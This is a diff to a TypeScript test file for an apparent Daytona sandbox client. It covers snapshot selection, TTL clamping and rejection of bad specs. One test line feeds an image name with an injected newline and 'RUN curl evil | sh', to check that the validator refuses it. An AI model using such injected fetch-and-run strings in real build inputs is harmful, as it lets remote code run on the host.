@@ -15,7 +15,7 @@ import {
   readApiKey,
   withSandbox,
 } from "../src/index";
-import { MOCK_KEY, startMock } from "./mock-daytona";
+import { MOCK_KEY, startMock } from "../src/testing/mock-daytona";
 
 let mock: ReturnType<typeof startMock>;
 beforeEach(() => {
@@ -106,6 +106,29 @@ describe("what is sent on create", () => {
     expect(() => on.buildCreateBody(spec({ image: "alpine\nRUN curl evil | sh" }))).toThrow(
       SpecError,
     );
+  });
+
+  test("a configured snapshot is used when the scheduler also names an image; the image name is ignored", async () => {
+    const p = make({ snapshot: "my-base" });
+    const body = p.buildCreateBody(spec({ image: "ghcr.io/example/runner:1" }));
+    expect(body.snapshot).toBe("my-base");
+    expect(body).not.toHaveProperty("buildInfo");
+    expect(() => make().buildCreateBody(spec({ image: "ghcr.io/example/runner:1" }))).toThrow(
+      /set a snapshot/,
+    );
+  });
+
+  test("clampTtl lowers an over-long TTL to the cap instead of refusing; the cap itself cannot exceed 30 minutes", async () => {
+    const strict = make();
+    expect(() => strict.buildCreateBody(spec({ ttlSeconds: 3900 }))).toThrow(SpecError);
+    const clamp = make({ clampTtl: true });
+    const body = clamp.buildCreateBody(spec({ ttlSeconds: 3900 }));
+    expect(body).toMatchObject({ ttlMinutes: 30, autoStopInterval: 30, autoDeleteInterval: 0 });
+    const lower = make({ clampTtl: true, maxTtlSeconds: 600 });
+    expect(lower.buildCreateBody(spec({ ttlSeconds: 3900 }))).toMatchObject({ ttlMinutes: 10 });
+    expect(lower.buildCreateBody(spec({ ttlSeconds: 120 }))).toMatchObject({ ttlMinutes: 2 });
+    expect(() => make({ maxTtlSeconds: 3600 })).toThrow(RangeError);
+    expect(() => make({ maxTtlSeconds: 30 })).toThrow(RangeError);
   });
 
   test("an existing snapshot can be named; resources are passed in Daytona units", async () => {
